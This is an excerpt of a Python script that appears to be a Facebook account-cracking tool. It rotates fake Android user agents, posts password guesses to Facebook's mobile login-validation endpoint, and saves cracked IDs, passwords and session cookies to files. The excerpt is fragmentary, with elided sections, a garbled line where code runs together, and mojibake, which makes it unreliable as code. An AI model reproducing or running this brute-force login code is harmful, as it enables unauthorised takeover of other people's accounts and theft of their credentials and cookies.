...
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Unguimport os,random

ugen=[]
for xd in range(100):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
...
┃┏━┓┃┃┃┃┃┃┃┃┗┛┃┃
┗┛╋┗┻┻┻┻┻┛┗┻━━┻┛
\033[1;35m__________________________________________________
\033[1;31m [+] AUTHOR   : AMINUR   RAHMAN      
\033[1;36m[+] GITHUB   : AMINUR69      
\033[1;37m[+] TOOLS    : \033[1;37mTrail\033[1;37m                 
\033[1;35m[+] VERSION  :  \033[1;35m0.1  \033[1;35m            
\033[1;32m_________________________________________________________________""")
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92mâ€¢\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Aminur,  Vai,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Aminurâ€¢M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}â€¢{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Aminur-Cp] {idf} â€¢ {pw}')
                ...
                print(f'\r\033[0;92m[Aminurl-OkðŸ’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Aminur,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Aminur-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}â€¢{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}â€¢Aminur-Cp] {idf} â€¢ {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
                akun.append(idf+' â€¢ '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}â€¢Aminur-Ok] {idf} â€¢ {pw} ')
                os.system('espeak -a 300 " Ok,  Aminur,  id"')
                open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
                break
